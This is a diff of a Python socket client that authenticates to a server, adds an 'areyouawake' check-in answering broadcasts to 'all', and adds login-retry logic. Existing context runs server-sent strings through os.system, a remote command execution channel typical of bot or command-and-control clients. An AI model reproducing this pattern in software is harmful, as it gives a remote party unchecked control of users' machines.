@@ -43,11 +43,9 @@ def generate_login_hash():
 
 login_hash = generate_login_hash()
 
-
 def encode_message(from_, to, request_type, request):
     message = {'From': from_, 'To': to, 'Request_Type': request_type, 'Request': request}
     return json.dumps(message).encode()
-
 
 def log(message):
     with open(data_file, 'a') as f:
@@ -74,6 +72,12 @@ def handle_server_messages():
         elif response_message['Request_Type'] == "cmd":
             os.system(response_message['Request'])
             log(response_message)
+        elif response_message['Request_Type'] == "areyouawake":
+            if response_message['Request'] == client_name or response_message['To'] == "all":
+                conn.send(encode_message(client_name, "all", "response", "Awake!"))
+                log(response_message)
+            else:
+                log(response_message)
         else:
             log(response_message)
 
@@ -89,6 +93,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
     if response == "Failed To Login: Invalid Hash":
         exit(1)
+    elif response == "Retry":
+        print("Reattempting Verification")
+        s.send(f'{client_name} {login_hash}'.encode())
+        print(login_hash)
+        response_data = s.recv(1024)
+        response = response_data.decode()
     else:
         print(response)
 
